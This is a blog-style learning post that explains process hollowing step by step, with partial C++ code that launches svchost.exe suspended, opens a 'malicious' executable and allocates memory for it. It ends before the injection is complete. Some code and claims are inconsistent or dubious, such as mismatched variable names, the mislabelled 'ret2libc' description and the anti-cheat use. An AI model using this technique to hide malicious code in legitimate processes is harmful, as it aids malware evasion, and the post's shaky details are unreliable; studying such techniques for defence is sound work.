
---
title: "Process Hollowing Demistyfied"
date: 2023-04-25
description: "ret2libc"
tags: ["Malware"]
type: post
weight: 20
showTableOfContents: true

---
# About
Process hollowing is a technique used by several malware authors used to run a legitimate process in suspended state and then replacing it's code with the contents of a new process.

## Positive implications
Before Understanding about how it is actually used in malware development, let's look at how can it be used for helping software developers during SDLC.

a) It can be used for identifying vulnerabilities in software before deployment. In several cases this technique also helps us to understand the inner working of a process and thus giving understand about their functional behaviour.

b) This technique is also used by game developers as an anti-cheat measure in their games. By injecting code into the game applications they can safeguard from players being able to cheat in games.

Other than the above, process hollowing is also used in fields like forensics analysis, Software Testing and Quality Assurance, etc.

## 😈 Interesting Part
![process_hollowing.png](https://hackmd.io/_uploads/BJZefLtX6.png)

I am myself learning from a github repo, so will try to note my learnings into this as and when I reading the thing in the other tab. Eventaully I will also try to recreate the whole thing and test it out. Though I understand this technique is already very well known, but I guess it kinda starts our journey into understanding various tactics used by malwares and also will help us to understand the details regarding what goes behind the curtains of this attack technique. Anyways let's get it to it then. Hopefully by the end of this we will have a working sample of Process Hollowing POC.



## Let's Code our way through !!

```
	LPSTARTUPINFOA target1 = new STARTUPINFOA();
	LPPROCESS_INFORMATION target2 = new     PROCESS_INFORMATION();
	CONTEXT c;
```
Well I spent a good amount of time in understanding what actually the above code snippet meant.

Let me jot down for you what it means point-wise

### I Explaination 
1. LPSTARTUPINFOA is a pointer to the structure STARTUPINFOA and on the right hand side we are dynamically allocating memory for the STARTUPINFOA structure. By the way important information, STARTUPINFOA structure is used to configure how a process runs.
2. For PROCESS_INFORMATION line, Exactly the same things are happening except that this structure is used to gain information about the new process created.
3. CONTEXT is the structure which gives us access to the context of the thread and also keep a track of the various registers used.

Hopefully I was able to explain the things, hence let's move on.

```

if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		target_si,
		target_pi) == 0) 
        {
		cout << "[!#!] Failed to create Target process. Last Error: " << GetLastError();
		return 1;
	}

```
Interesting eh 😁!!

### II Explaination
1. We use CreateProcessA API an API used to create a new process and runs in the context of the calling process.
2. Two very important arguments in the above context are first one which is to be created and the CREATE_SUSPENDED flag.
3. For more information refer to [CreateProcessA MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

```
	HANDLE hMaliciousCode = CreateFileA(
		(LPCSTR)"C:\\Users\\Sample\\Desktop\\Dev\\SusProcess\\Debug\\SusProcess.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	cout << "[+] Process PID-> 0x" << target_pi->dwProcessId << endl;

	if (hMaliciousCode == INVALID_HANDLE_VALUE) {
		cout << "[!] Failed to open Malicious file: " << GetLastError()<<endl;
		TerminateProcess(target_pi->hProcess, 0);
	}
	cout << "[#+#] Malicious file opened." << endl;
```

Well it might look little daunting, but it is kinda easy to get to it.

Breaking it down 😉

### III Explaination
1. Like last snippet we are opening a handle to our malicious proces.
2. We then for debug purposes print the process opened before's PID.
3. We check whether our 💀 suspicious process is succesfully created if not then we terminate it.
4. Finally we print a message saying that out malicious file is opened.
 
So the story till now stands like this,
- We have two processes opened with a handle poiting to the latter one.
- And most importantly the first one is opened in a suspended state

</br>

```
	DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0);
	cout << "[+] Malicious file size: " << maliciousFileSize << " bytes." << endl;

	PVOID pMaliciousImage = VirtualAlloc(NULL,maliciousFileSize,0x3000,0x04);
    
```

Well looks kinda interesting, We have reference to VirtualAlloc and that is definitely something fishy 🤔.

### IV Explaination
1. In the above context we have used two APIs.
2. GetFileSize is used to find the size of our malicious executable in bytes so that the same can be used to map a memory region for further running of process.
3. VirtualAlloc is the API used for allocating a region of memory in the virtual address space of our process, in this case the 1st process.
4. maliciousFileSize is used to tell the size used for allocating the amount of memory.
5. 0x3000 indicates to allocation type which corresponds to 'MEM_COMMIT | MEM_RESERVE', which in turn means that memory of both reserved and intialized, and marked as a placeholder in the process's address space.

Well now I have a feeling we are slowly getting there for the actuall part, let the suspense be there ⏳.




